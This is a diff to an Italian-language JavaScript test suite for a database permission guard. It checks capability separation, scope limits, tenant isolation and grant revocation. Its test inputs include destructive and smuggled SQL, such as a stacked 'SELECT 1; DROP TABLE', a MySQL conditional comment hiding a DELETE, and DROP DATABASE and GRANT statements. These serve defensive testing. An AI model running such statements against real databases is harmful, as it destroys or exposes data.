+      /Permesso negato.*modifica della struttura/,
+      'read+write non include implicitamente ddl',
+    );
+
+    const deleteSql = guardStrategy(pgStrategy(), { principal: deleteUser, connName: 'prod' });
+    await deleteSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' });
+    await deleteSql.collectionAggregate('public', null, {
+      pipeline: 'WITH rimossi AS (DELETE FROM clienti RETURNING *) SELECT * FROM rimossi',
+    });
+    await assert.rejects(
+      () => deleteSql.collectionAggregate('public', null, { pipeline: 'UPDATE clienti SET attivo = 0' }),
+      /Permesso negato.*scrittura/,
+    );
+
+    const ddlSql = guardStrategy(pgStrategy(), { principal: ddlUser, connName: 'prod' });
+    await ddlSql.collectionAggregate('public', null, { pipeline: 'DROP TABLE clienti' });
+    await assert.rejects(
+      () => ddlSql.collectionAggregate('public', null, { pipeline: 'DELETE FROM clienti WHERE id = 1' }),
+      /Permesso negato.*cancellazione/,
+    );
+    await assert.rejects(
+      () => guardStrategy(pgStrategy(), { principal: writeOnlyUser, connName: 'prod' })
+        .collectionAggregate('public', null, {
+          pipeline: 'UPDATE clienti SET attivo = 1 RETURNING email',
+        }),
+      /Permesso negato.*lettura/,
+      'UPDATE RETURNING non esfiltra dati con la sola capability write',
+    );
+    await assert.rejects(
+      () => guardStrategy(pgStrategy(), { principal: deleteOnlyUser, connName: 'prod' })
+        .collectionAggregate('public', null, {
+          pipeline: 'DELETE FROM clienti WHERE id = 1 RETURNING email',
+        }),
+      /Permesso negato.*lettura/,
+      'DELETE RETURNING richiede read oltre a delete',
+    );
+    await assert.rejects(
+      () => guardStrategy(pgStrategy(), { principal: ddlOnlyUser, connName: 'prod' })
+        .collectionAggregate('public', null, {
+          pipeline: 'CREATE TABLE copia AS SELECT * FROM clienti',
+        }),
+      /Permesso negato.*lettura/,
+      'CREATE TABLE AS SELECT richiede read oltre a ddl',
+    );
+
+    await assert.rejects(
+      () => guardStrategy(pgStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' })
+        .collectionAggregate('public', null, { pipeline: 'SELECT 1; DROP TABLE clienti' }),
+      /Più istruzioni SQL/,
+      'SQL Raw è fail-closed sul multi-statement anche per root: gli script usano ScriptRunner',
+    );
+    await assert.rejects(
+      () => guardStrategy(pgStrategy(), { principal: ROOT_PRINCIPAL, connName: 'prod' })
+        .collectionAggregate('public', null, { pipeline: '/*!50000 DELETE FROM clienti */' }),
+      /commenti SQL eseguibili/,
+      'i commenti condizionali MySQL/MariaDB non possono occultare un comando',
+    );
+    assert.strictEqual(eseguite.length, 4, 'solo le quattro istruzioni autorizzate raggiungono la strategia');
+    console.log('  OK   SQL Raw: capability delete/ddl distinte e multi-statement negato');
   }
 
   /* --- Clausole WHERE/ORDER BY libere e scope (CDB-05) ----------------------- */
@@ -445,6 +980,51 @@ function fakeStrategy() {
     const gFree = guardStrategy(sqlStrategy(), { principal: senzaScope, connName: 'prod' });
     await gFree.collectionFind('shop', 'ordini', { filter: '1=1 AND (SELECT 1) > 0' }); // nessuna regressione
     console.log('  OK   Clausole libere limitate ai soli principal con scope (CDB-05)');
+  }
+
+  /* --- Revoca grant quando una connessione cambia identità ------------------ */
+  {
+    const { AppStore } = require('../auth/AppStore');
+    const rows = [
+      { ownerId: 'owner-a', connName: 'prod', subjectId: 'u1' },
+      { ownerId: 'owner-a', connName: 'prod', subjectId: 'u2' },
+      { ownerId: 'owner-a', connName: 'altro', subjectId: 'u3' },
+      { ownerId: 'owner-b', connName: 'prod', subjectId: 'u4' },
+    ];
+    const store = new AppStore({ uri: 'mongodb://unused', dbName: 'unused' });
+    store.col = (name) => {
+      assert.strictEqual(name, 'grants');
+      return {
+        find(query) {
+          const selected = rows.filter(
+            (row) => row.ownerId === query.ownerId && row.connName === query.connName
+          );
+          return {
+            project() {
+              return { toArray: async () => selected.map((row) => ({ subjectId: row.subjectId })) };
+            },
+          };
+        },
+        async deleteMany(query) {
+          let deletedCount = 0;
+          for (let i = rows.length - 1; i >= 0; i--) {
+            if (rows[i].ownerId === query.ownerId && rows[i].connName === query.connName) {
+              rows.splice(i, 1);
+              deletedCount++;
+            }
+          }
+          return { deletedCount };
+        },
+      };
+    };
+    const revoked = await store.revokeGrantsForConnection('owner-a', 'prod');
+    assert.deepStrictEqual(revoked, { deleted: 2, subjectIds: ['u1', 'u2'] });
+    assert.deepStrictEqual(
+      rows.map((row) => [row.ownerId, row.connName, row.subjectId]),
+      [['owner-a', 'altro', 'u3'], ['owner-b', 'prod', 'u4']],
+      'la revoca non tocca connessioni omonime di altri tenant',
+    );
+    console.log('  OK   Delete/rename connessione revocano i grant legati al vecchio nome');
   }
 
   /* --- Login dei sottoutenti e isolamento fra tenant (CDB-44) ---------------- */
@@ -527,7 +1107,7 @@ function fakeStrategy() {
     };
     const conScope = makePrincipal(
       { _id: 'u1', ownerId: 'o1', type: 'subuser' },
-      [{ connName: 'c', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['ordini'] } }],
+      [{ connName: 'c', role: 'editor', capabilities: ['read', 'write'], scope: { databases: ['shop'], collections: ['ordini*'] } }],
     );
     const g = guardStrategy(raw, { principal: conScope, connName: 'c' });
 
@@ -544,11 +1124,80 @@ function fakeStrategy() {
       /"utenti" è fuori dal tuo ambito/,
       'una UPDATE senza FROM non è più autorizzata dal coll dichiarato dal client',
     );
-    assert.strictEqual(eseguite.length, 0, 'nessuna delle due ha raggiunto il database');
 
-    // Il lavoro legittimo dello stesso utente continua a passare.
-    await g.collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM ordini WHERE totale > 100' });
-    assert.strictEqual(eseguite.length, 1, 'la query dentro l\'ambito viene eseguita');
+    // Il DDL libero ha molti bersagli che il parser delle tabelle non può
+    // dimostrare (database/schema, view, ruoli e privilegi). Con scope attivo
+    // viene chiuso fail-closed; le operazioni strutturate restano disponibili.
+    const ddlConScope = makePrincipal(
+      { _id: 'u-ddl-scope', ownerId: 'o1', type: 'subuser' },
+      [{ connName: 'c', role: 'custom', capabilities: ['read', 'write', 'delete', 'ddl'], scope: { databases: ['shop'], collections: ['ordini'] } }],
+    );
+    const gDdl = guardStrategy(raw, { principal: ddlConScope, connName: 'c' });
+    const { tabelleCitate } = require('../auth/sqlTables');
+    assert.deepStrictEqual(
+      tabelleCitate('DELETE FROM ordini USING utenti WHERE ordini.id = utenti.id').tabelle.map((t) => t.tabella),
+      ['ordini', 'utenti'],
+    );
+    assert.deepStrictEqual(
+      tabelleCitate('MERGE INTO ordini USING utenti ON ordini.id = utenti.id WHEN MATCHED THEN UPDATE SET x = 1').tabelle.map((t) => t.tabella),
+      ['ordini', 'utenti'],
+    );
+    assert.deepStrictEqual(
+      tabelleCitate('SELECT * FROM ordini JOIN clienti USING (id)').tabelle.map((t) => t.tabella),
+      ['ordini', 'clienti'],
+      'JOIN USING(colonna) non scambia la colonna per una tabella',
+    );
+    await assert.rejects(
+      () => gDdl.collectionAggregate('shop', 'ordini', {
+        pipeline: 'DELETE FROM ordini USING utenti WHERE ordini.id = utenti.id',
+      }),
+      /"utenti" è fuori dal tuo ambito/,
+    );
+    await assert.rejects(
+      () => gDdl.collectionAggregate('shop', 'ordini', {
+        pipeline: 'MERGE INTO ordini USING utenti ON ordini.id = utenti.id WHEN MATCHED THEN UPDATE SET x = 1',
+      }),
+      /"utenti" è fuori dal tuo ambito/,
+    );
+    const ddlNonVerificabile = [
+      'DROP DATABASE altro',
+      'DROP SCHEMA altro',
+      'CREATE VIEW utenti AS SELECT * FROM ordini',
+      'GRANT SELECT ON shop.ordini TO altro_utente',
+      'CREATE ROLE auditor',
+    ];
+    for (const sql of ddlNonVerificabile) {
+      await assert.rejects(
+        () => gDdl.collectionAggregate('shop', 'ordini', { pipeline: sql }),
+        /SQL Raw non consentito con un ambito limitato/,
+        `DDL non verificabile negato: ${sql}`,
+      );
+    }
+    assert.strictEqual(eseguite.length, 0, 'nessuna query fuori scope ha raggiunto il database');
+
+    // Anche se tutti i nomi visibili sono nello scope, view e funzioni possono
+    // avere dipendenze invisibili: SQL Raw scoped resta fail-closed.
+    await assert.rejects(
+      () => g.collectionAggregate('shop', 'ordini', {
+        pipeline: 'SELECT * FROM ordini WHERE totale > 100',
+      }),
+      /SQL Raw non consentito con un ambito limitato/,
+    );
+    await assert.rejects(
+      () => g.collectionAggregate('shop', 'ordini', {
+        pipeline: 'SELECT * FROM ordini_view',
+      }),
+      /SQL Raw non consentito con un ambito limitato/,
+      'una view autorizzata può dipendere da tabelle fuori scope',
+    );
+    await assert.rejects(
+      () => g.collectionAggregate('shop', 'ordini', {
+        pipeline: 'SELECT leak_secret()',
+      }),
+      /SQL Raw non consentito con un ambito limitato/,
+      'una funzione scalare non espone al parser le tabelle che legge',
+    );
+    assert.strictEqual(eseguite.length, 0, 'nessun SQL Raw scoped raggiunge il database');
 
     // Owner e sottoutenti SENZA scope non perdono nulla: stessa regola già
     // adottata per le clausole libere della griglia.
@@ -561,7 +1210,29 @@ function fakeStrategy() {
     const owner = makePrincipal({ _id: 'o1', ownerId: 'o1', type: 'owner' }, []);
     await guardStrategy(raw, { principal: owner, connName: 'c' })
       .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
-    assert.strictEqual(eseguite.length, 3, 'senza scope attivo la restrizione non si applica');
+    const scopeConWildcard = makePrincipal(
+      { _id: 'u3', ownerId: 'o1', type: 'subuser' },
+      [{
+        connName: 'c',
+        role: 'editor',
+        capabilities: ['read', 'write'],
+        scope: { databases: ['shop', '*'], collections: ['ordini', '*'] },
+      }],
+    );
+    await guardStrategy(raw, { principal: scopeConWildcard, connName: 'c' })
+      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
+    const scopeConListeVuote = makePrincipal(
+      { _id: 'u4', ownerId: 'o1', type: 'subuser' },
+      [{
+        connName: 'c',
+        role: 'editor',
+        capabilities: ['read', 'write'],
+        scope: { databases: [], collections: [] },
+      }],
+    );
+    await guardStrategy(raw, { principal: scopeConListeVuote, connName: 'c' })
+      .collectionAggregate('shop', 'ordini', { pipeline: 'SELECT * FROM utenti' });
+    assert.strictEqual(eseguite.length, 4, 'gli scope effettivamente illimitati non bloccano SQL Raw');
 
     // Su MongoDB `pipeline` è EJSON, non SQL: la regola non deve toccarlo.
     const mongo = { type: 'mongodb', async collectionAggregate() { return { docs: [] }; } };
@@ -570,7 +1241,7 @@ function fakeStrategy() {
         .collectionAggregate('shop', 'ordini', { pipeline: '[{"$match":{"from":"utenti"}}]' }),
       'la pipeline MongoDB non passa dall\'analizzatore SQL',
     );
-    console.log('  OK   Scope su SQL Raw applicato alle tabelle citate (CDB-A03)');
+    console.log('  OK   SQL Raw fail-closed sugli scope realmente limitati (CDB-A03)');
   }
 
   // --- Amministratore dell'installazione vs del tenant (CDB-A02) -----------
